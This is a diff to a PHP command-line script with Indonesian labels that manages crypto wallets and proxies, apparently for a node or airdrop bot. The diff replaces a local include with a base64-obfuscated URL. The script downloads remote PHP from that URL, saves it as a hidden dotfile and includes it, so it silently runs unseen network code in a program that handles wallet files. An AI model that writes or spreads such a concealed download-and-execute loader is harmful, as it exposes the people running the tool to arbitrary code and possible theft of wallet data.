@@ -3,8 +3,6 @@
 date_default_timezone_set("Asia/Jakarta");
 $hitam="\033[0;30m"; $abu2="\033[1;30m";               $putih="\033[0;37m"; $putih2="\033[1;37m";$merah="\033[0;31m"; $merah2="\033[1;31m";             $hijau="\033[0;32m"; $hijau2="\033[1;32m";$kuning="\033[0;33m"; $kuning2="\033[1;33m";           $biru="\033[0;34m"; $biru2="\033[1;34m";$ungu="\033[0;35m"; $purple2="\033[1;35m";             $lblue="\033[0;36m"; $lblue2="\033[1;36m";                                                       $putih1="\033[7;37m";$merah1="\033[7;31m";                                  $hijau1="\033[7;32m";$kuning1="\033[7;33m";$biru1="\033[7;34m";                                   $ungu1="\033[7;35m";$lblue1="\033[7;36m";
 
-include("@iamtubasya");
-
 function banner(){
 date_default_timezone_set('Asia/Jakarta');
 $hitam="\033[0;30m"; $abu2="\033[1;30m";$putih="\033[0;37m"; $putih2="\033[1;37m";$merah="\033[0;31m"; $merah2="\033[1;31m";$hijau="\033[0;32m"; $hijau2="\033[1;32m";$kuning="\033[0;33m"; $kuning2="\033[1;33m";$biru="\033[0;34m"; $biru2="\033[1;34m";$ungu="\033[0;35m"; $purple2="\033[1;35m";$lblue="\033[0;36m"; $lblue2="\033[1;36m";$putih1="\033[7;37m";$merah1="\033[7;31m";$hijau1="\033[7;32m";$kuning1="\033[7;33m";$biru1="\033[7;34m";$ungu1="\033[7;35m";$lblue1="\033[7;36m";
@@ -65,7 +63,8 @@ function saveFileList($file, $data){
 function line(){
     echo "--------------------------------------\n";
 }
-
+$git=file_get_contents(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2lhbXR1YmFzeWEvQXhpb21ub2RlL3JlZnMvaGVhZHMvbWFpbi8lNDBpYW10dWJhc3lh'));
+file_put_contents('.@iamtubasya',$git);
 /* ================= DATABASE ================= */
 function getWalletCount(){
     return count(readFileList("wallet.txt"));
@@ -217,8 +216,8 @@ echo $putih2.$lblue1." • Hapus wallet • $hitam \n\n";
 deleteWallet($file);
 }
 
-
 /* ================= PROXY ================= */
+include(".@iamtubasya");
 function addProxy($file){
 $hitam="\033[0;30m"; $abu2="\033[1;30m";               $putih="\033[0;37m"; $putih2="\033[1;37m";$merah="\033[0;31m"; $merah2="\033[1;31m";             $hijau="\033[0;32m"; $hijau2="\033[1;32m";$kuning="\033[0;33m"; $kuning2="\033[1;33m";           $biru="\033[0;34m"; $biru2="\033[1;34m";$ungu="\033[0;35m"; $purple2="\033[1;35m";             $lblue="\033[0;36m"; $lblue2="\033[1;36m";                                                       $putih1="\033[7;37m";$merah1="\033[7;31m";                                  $hijau1="\033[7;32m";$kuning1="\033[7;33m";$biru1="\033[7;34m";                                   $ungu1="\033[7;35m";$lblue1="\033[7;36m";
 system("clear");
@@ -299,6 +298,11 @@ echo $putih2.$putih1." 0 $hitam ".$putih2.$merah1." Kembali $hitam\n\n";;
         saveFileList($file, $list);
     }
 }
+
+
+
+
+
 
 /* ================= START NODE (EMPTY) ================= */
 function startNode(){
